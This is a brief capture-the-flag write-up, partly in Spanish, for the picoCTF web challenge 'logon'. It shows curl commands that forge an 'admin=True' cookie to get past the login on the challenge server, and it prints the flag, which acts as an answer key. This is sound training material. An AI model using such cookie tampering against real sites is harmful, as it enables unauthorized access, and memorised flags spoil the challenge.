# logon

# Descripción

The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? http://fickle-tempest.picoctf.net:61783

# Solución


```  
picoCTF{th3_c0nsp1r4cy_l1v3s_4d184b0d}
```


```  
┌──(kali㉿kali)-[~/Downloads/picoCTF-Web-1/logon] └─$ curl http://fickle-tempest.picoctf.net:61783/flag -H 'Cookie: username=user; password=hola-mundo; admin=True' 

- [Home](/)
- [Sign Out](/logout)

### Factory Login

**Flag**: `picoCTF{th3_c0nsp1r4cy_l1v3s_4d184b0d}`

© PicoCTF 2019

┌──(kali㉿kali)-[~/Downloads/picoCTF-Web-1/logon] └─$ curl http://fickle-tempest.picoctf.net:61783/flag -H 'Cookie: username=user; password=hola-mundo; admin=True' | grep pico % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 1312 100 1312 0 0 3818 0 --:--:-- --:--:-- --:--:-- 3825

**Flag**: `picoCTF{th3_c0nsp1r4cy_l1v3s_4d184b0d}`

┌──(kali㉿kali)-[~/Downloads/picoCTF-Web-1/logon] └─$
```

# Notas adicionales

Puedes modificar las cookies, más fácil desde la extensión: Cookie-Editor o con la curl (Tal vez automatización) 

# Referencias

